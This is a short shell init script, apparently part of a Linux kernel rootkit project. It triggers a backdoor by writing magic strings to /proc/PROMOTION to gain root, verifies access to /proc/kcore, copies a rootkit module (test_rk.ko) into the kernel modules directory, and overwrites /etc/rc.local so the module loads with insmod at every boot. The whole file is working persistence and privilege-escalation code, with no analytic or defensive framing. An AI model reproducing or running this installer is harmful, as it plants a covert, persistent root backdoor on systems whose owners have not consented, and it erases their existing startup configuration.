#!/bin/sh
### BEGIN INIT INFO
# Provides:          rootkit
# Required-Start:    
# Required-Stop:     
# Should-Start:      checkroot
# Should-Stop:
# Default-Start:     S
# Default-Stop:
# Short-Description: auto start the rootkit module.
# Description:       auto start the rootkit module.
### END INIT INFO

# can not read /proc/kcore
id && file /proc/kcore

#now we can
printf '%s' try_promotion > /proc/PROMOTION && \
	printf '%s' AUTHME > /proc/PROMOTION && \
	id && \
	file /proc/kcore

#cp ko to dir
rootkit="test_rk.ko"
cp $rootkit /lib/modules/$(uname -r)

#write insmod rootkit to rc.local so it can auto start
echo "#!/bin/sh -e 
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
insmod /lib/modules/$(uname -r)/$rootkit
exit 0
">/etc/rc.local

